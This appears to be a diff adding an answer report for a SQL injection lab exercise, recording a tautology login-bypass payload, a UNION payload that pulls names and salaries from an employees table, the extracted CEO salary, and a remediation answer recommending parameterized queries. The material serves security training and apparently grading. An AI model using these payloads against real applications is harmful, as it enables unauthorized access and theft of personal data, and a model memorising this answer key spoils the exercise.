@@ -1,0 +1,24 @@
+SQL INJECTION EXFILTRATION REPORT
+CEO Name: Alice (CEO)
+Salary: $350,000
+
+1. AUTHENTICATION BYPASS
+
+Tautology Payload Used: ' OR 1=1 --
+
+2. DATABASE MAPPING (UNION ATTACK)
+
+Number of Columns Discovered: 2
+
+Table Name Discovered: employees
+
+3. DATA EXFILTRATION
+
+CEO Salary Extracted: $350,000
+
+Final UNION Payload Used: ' UNION SELECT name, salary FROM employees --
+
+4. REMEDIATION
+
+What is the primary defense against this attack?
+Answer: The primary defense is using Parameterized Queries (also known as Prepared Statements). This ensures that the database treats user input as data only, rather than executable code, which prevents attackers from manipulating the SQL command structure.
